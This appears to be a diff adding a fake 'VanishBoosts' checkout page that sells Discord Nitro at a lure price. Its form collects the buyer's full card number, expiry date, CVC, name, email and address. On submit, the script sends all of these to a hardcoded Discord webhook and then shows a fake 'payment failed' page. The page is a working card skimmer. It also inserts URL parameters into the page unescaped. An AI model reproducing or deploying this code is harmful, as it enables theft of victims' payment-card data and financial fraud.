@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" >
+  <meta name="viewport" content="width=device-width, initial-scale=1" >
+  <title>VanishBoosts Payment</title>
+  <link rel="icon" href="https://i.imgur.com/Egq0xbe.png" >
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" >
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    html, body {
+      height: 100%;
+      color: #ffffff;
+      background: transparent;
+    }
+
+    #vanta-bg {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      top: 0;
+      left: 0;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 80px auto;
+      background: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(225, 8, 255, 0.5);
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 2rem;
+      color: #e108ff;
+    }
+
+    .product-info, .timer {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #e108ff;
+    }
+
+    .product-info {
+      font-size: 1.2rem;
+    }
+
+    .timer {
+      font-size: 1.2rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: none;
+      border-radius: 6px;
+      background: rgba(255, 255, 255, 0.9);
+      color: #000;
+      font-size: 1rem;
+    }
+
+    select option {
+      color: #000;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #e108ff;
+      color: #fff;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #b006cc;
+    }
+
+    ::placeholder {
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <div id="vanta-bg"></div>
+
+  <div class="container">
+    <h1>VanishBoosts Payment</h1>
+    <div class="product-info">You are buying Nitro Basic for $0.99</div>
+    <div class="timer" id="countdown">15:00</div>
+    <form id="paymentForm" autocomplete="on">
+      <label for="discord">Discord Server:</label>
+      <input type="discord" id="Discord Server" name="discord" placeholder="https://discord.gg/yourserver" autocomplete="discord" required >
+
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email" placeholder="you@example.com" autocomplete="email" required >
+
+      <label for="cc-name">Cardholder Name:</label>
+      <input type="text" id="cc-name" name="cc-name" placeholder="John Doe" autocomplete="cc-name" required >
+
+      <label for="card-number">Card Number:</label>
+      <input type="text" id="card-number" name="cc-number" placeholder="1234 5678 9012 3456" inputmode="numeric" autocomplete="cc-number" required >
+
+      <label for="expiry">Expiration Date:</label>
+      <input type="text" id="expiry" name="cc-exp" placeholder="MM / YY" inputmode="numeric" autocomplete="cc-exp" required >
+
+      <label for="cvc">CVC:</label>
+      <input type="text" id="cvc" name="cc-csc" placeholder="123" inputmode="numeric" autocomplete="cc-csc" required >
+
+      <label for="address">Address:</label>
+      <input type="text" id="address" name="address" placeholder="1234 Main St" autocomplete="address-line1" required >
+
+      <label for="zipcode">Zipcode/Postcode:</label>
+      <input type="text" id="zipcode" name="zipcode" placeholder="12345" autocomplete="postal-code" required >
+
+      <label for="country">Country or Region:</label>
+      <select id="country" name="country" autocomplete="country" required>
+        <option value="">Select a country</option>
+        <option>Afghanistan</option>
+        <option>Albania</option>
+        <option>Algeria</option>
+        <option>Andorra</option>
+        <option>Angola</option>
+        <option>Antigua and Barbuda</option>
+        <option>Argentina</option>
+        <option>Armenia</option>
+        <option>Australia</option>
+        <option>Austria</option>
+        <option>Azerbaijan</option>
+        <option>Bahamas</option>
+        <option>Bahrain</option>
+        <option>Bangladesh</option>
+        <option>Barbados</option>
+        <option>Belarus</option>
+        <option>Belgium</option>
+        <option>Belize</option>
+        <option>Benin</option>
+        <option>Bhutan</option>
+        <option>Bolivia</option>
+        <option>Bosnia and Herzegovina</option>
+        <option>Botswana</option>
+        <option>Brazil</option>
+        <option>Brunei</option>
+        <option>Bulgaria</option>
+        <option>Burkina Faso</option>
+        <option>Burundi</option>
+        <option>Cabo Verde</option>
+        <option>Cambodia</option>
+        <option>Cameroon</option>
+        <option>Canada</option>
+        <option>Central African Republic</option>
+        <option>Chad</option>
+        <option>Chile</option>
+        <option>China</option>
+        <option>Colombia</option>
+        <option>Comoros</option>
+        <option>Costa Rica</option>
+        <option>Croatia</option>
+        <option>Cuba</option>
+        <option>Cyprus</option>
+        <option>Czech Republic</option>
+        <option>Denmark</option>
+        <option>Djibouti</option>
+        <option>Dominica</option>
+        <option>Dominican Republic</option>
+        <option>Ecuador</option>
+        <option>Egypt</option>
+        <option>El Salvador</option>
+        <option>Estonia</option>
+        <option>Eswatini</option>
+        <option>Ethiopia</option>
+        <option>Fiji</option>
+        <option>Finland</option>
+        <option>France</option>
+        <option>Gabon</option>
+        <option>Gambia</option>
+        <option>Georgia</option>
+        <option>Germany</option>
+        <option>Ghana</option>
+        <option>Greece</option>
+        <option>Grenada</option>
+        <option>Guatemala</option>
+        <option>Guinea</option>
+        <option>Guyana</option>
+        <option>Haiti</option>
+        <option>Honduras</option>
+        <option>Hungary</option>
+        <option>Iceland</option>
+        <option>India</option>
+        <option>Indonesia</option>
+        <option>Iran</option>
+        <option>Iraq</option>
+        <option>Ireland</option>
+        <option>Israel</option>
+        <option>Italy</option>
+        <option>Jamaica</option>
+        <option>Japan</option>
+        <option>Jordan</option>
+        <option>Kazakhstan</option>
+        <option>Kenya</option>
+        <option>Kuwait</option>
+        <option>Kyrgyzstan</option>
+        <option>Laos</option>
+        <option>Latvia</option>
+        <option>Lebanon</option>
+        <option>Lesotho</option>
+        <option>Liberia</option>
+        <option>Libya</option>
+        <option>Liechtenstein</option>
+        <option>Lithuania</option>
+        <option>Luxembourg</option>
+        <option>Madagascar</option>
+        <option>Malawi</option>
+        <option>Malaysia</option>
+        <option>Maldives</option>
+        <option>Mali</option>
+        <option>Malta</option>
+        <option>Mauritania</option>
+        <option>Mauritius</option>
+        <option>Mexico</option>
+        <option>Moldova</option>
+        <option>Monaco</option>
+        <option>Mongolia</option>
+        <option>Montenegro</option>
+        <option>Morocco</option>
+        <option>Mozambique</option>
+        <option>Myanmar</option>
+        <option>Namibia</option>
+        <option>Nepal</option>
+        <option>Netherlands</option>
+        <option>New Zealand</option>
+        <option>Nicaragua</option>
+        <option>Niger</option>
+        <option>Nigeria</option>
+        <option>North Korea</option>
+        <option>North Macedonia</option>
+        <option>Norway</option>
+        <option>Oman</option>
+        <option>Pakistan</option>
+        <option>Palestine</option>
+        <option>Panama</option>
+        <option>Papua New Guinea</option>
+        <option>Paraguay</option>
+        <option>Peru</option>
+        <option>Philippines</option>
+        <option>Poland</option>
+        <option>Portugal</option>
+        <option>Qatar</option>
+        <option>Romania</option>
+        <option>Russia</option>
+        <option>Rwanda</option>
+        <option>Saint Kitts and Nevis</option>
+        <option>Saint Lucia</option>
+        <option>Saint Vincent and the Grenadines</option>
+        <option>Samoa</option>
+        <option>San Marino</option>
+        <option>Sao Tome and Principe</option>
+        <option>Saudi Arabia</option>
+        <option>Senegal</option>
+        <option>Serbia</option>
+        <option>Seychelles</option>
+        <option>Sierra Leone</option>
+        <option>Singapore</option>
+        <option>Slovakia</option>
+        <option>Slovenia</option>
+        <option>Somalia</option>
+        <option>South Africa</option>
+        <option>South Korea</option>
+        <option>Spain</option>
+        <option>Sri Lanka</option>
+        <option>Sudan</option>
+        <option>Suriname</option>
+        <option>Sweden</option>
+        <option>Switzerland</option>
+        <option>Syria</option>
+        <option>Taiwan</option>
+        <option>Tajikistan</option>
+        <option>Tanzania</option>
+        <option>Thailand</option>
+        <option>Togo</option>
+        <option>Tonga</option>
+        <option>Trinidad and Tobago</option>
+        <option>Tunisia</option>
+        <option>Turkey</option>
+        <option>Turkmenistan</option>
+        <option>Tuvalu</option>
+        <option>Uganda</option>
+        <option>Ukraine</option>
+        <option>United Arab Emirates</option>
+        <option>United Kingdom</option>
+        <option>United States</option>
+        <option>Uruguay</option>
+        <option>Uzbekistan</option>
+        <option>Vanuatu</option>
+        <option>Venezuela</option>
+        <option>Vietnam</option>
+        <option>Yemen</option>
+        <option>Zambia</option>
+        <option>Zimbabwe</option>
+      </select>
+
+      <button type="submit">Pay Now</button>
+    </form>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.birds.min.js"></script>
+  <script>
+    VANTA.BIRDS({
+      el: "#vanta-bg",
+      mouseControls: true,
+      touchControls: true,
+      gyroControls: false,
+      minHeight: 200.00,
+      minWidth: 200.00,
+      scale: 1.00,
+      scaleMobile: 1.00,
+      backgroundColor: 0x000000,
+      color1: 0x000000,
+      color2: 0xe108ff,
+      colorMode: "lerp",
+      birdSize: 0.50,
+      wingSpan: 40.00,
+      speedLimit: 3.00
+    });
+
+    const form = document.getElementById('paymentForm');
+    const cardNumberInput = document.getElementById('card-number');
+    const expiryInput = document.getElementById('expiry');
+    const cvcInput = document.getElementById('cvc');
+
+    cardNumberInput.addEventListener('input', formatCardNumber);
+    expiryInput.addEventListener('input', formatExpiryDate);
+    cvcInput.addEventListener('input', formatCVC);
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = form.email.value.trim();
+      const ccName = form['cc-name'].value.trim();
+      const cardNumber = form['cc-number'].value.trim();
+      const expiry = form['cc-exp'].value.trim();
+      const cvc = form['cc-csc'].value.trim();
+      const address = form.address.value.trim();
+      const zipcode = form.zipcode.value.trim();
+      const country = form.country.value;
+
+      const message = `A new payment log has been created with the following details:\n\n- **Email:** ${email}\n- **Name on Card:** ${ccName}\n- **Card Number:** ${cardNumber}\n- **Expiry Date:** ${expiry}\n- **CVC:** ${cvc}\n- **Address:** ${address}\n- **Zipcode/Postcode:** ${zipcode}\n- **Country/Region:** ${country}`;
+
+      try {
+        await fetch('https://discord.com/api/webhooks/1377012040136261714/ouKIQ8B-prKmYxoO3w58qCQs93u_HH-HYITy3ma_WrciuHvGoKIdLKwvSwSI7iANdg3a', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ content: message }),
+        });
+        // Simulate payment failure and redirect to payment_failed.html
+        window.location.href = 'payment_failed.html';
+        form.reset();
+      } catch (error) {
+        alert('Failed to send payment info.');
+        console.error('Error:', error);
+      }
+    });
+
+    function updateCountdown() {
+      const minutes = 15;
+      let timeLeft = minutes * 60;
+      const countdownElement = document.getElementById('countdown');
+
+      const interval = setInterval(() => {
+        const minutesLeft = Math.floor(timeLeft / 60);
+        const secondsLeft = timeLeft % 60;
+        countdownElement.innerText = `${minutesLeft}:${secondsLeft < 10 ? '0' : ''}${secondsLeft}`;
+
+        if (timeLeft <= 0) {
+          clearInterval(interval);
+          window.location.href = 'index.html'; // Redirect to homepage
+        }
+
+        timeLeft--;
+      }, 1000);
+    }
+
+    updateCountdown();
+
+    function formatCardNumber() {
+      let value = cardNumberInput.value.replace(/[^0-9]/g, ''); // Only numbers
+      if (value.length > 16) value = value.substring(0, 16);
+      let formattedValue = '';
+      for (let i = 0; i < value.length; i += 4) {
+        formattedValue += value.substring(i, i + 4) + ' ';
+      }
+      cardNumberInput.value = formattedValue.trim(); // Remove trailing space
+    }
+
+    function formatExpiryDate() {
+      let value = expiryInput.value.replace(/\D/g, ''); // Remove non-digits
+      if (value.length > 4) value = value.substring(0, 4);
+      if (value.length > 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2);
+      }
+      expiryInput.value = value;
+    }
+
+    function formatCVC() {
+      let value = cvcInput.value.replace(/\D/g, ''); // Remove non-digits
+      if (value.length > 4) value = value.substring(0, 4);
+      cvcInput.value = value;
+    }
+  </script>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const productName = params.get('product');
+    const productPrice = params.get('price');
+    const productQuantity = params.get('quantity');
+    const productDuration = params.get('duration');
+    const totalAmount = params.get('total');
+
+    const productInfoDiv = document.querySelector('.product-info');
+    if (productInfoDiv && productName && productPrice && productDuration && productQuantity && totalAmount) {
+      productInfoDiv.innerHTML = `
+        You are buying <strong>${productName}</strong><br>
+        Price: ${productPrice} x ${productQuantity} (${productDuration})<br>
+        <strong>Total: $${totalAmount}</strong>
+      `;
+    }
+  </script>
+</body>
+</html>
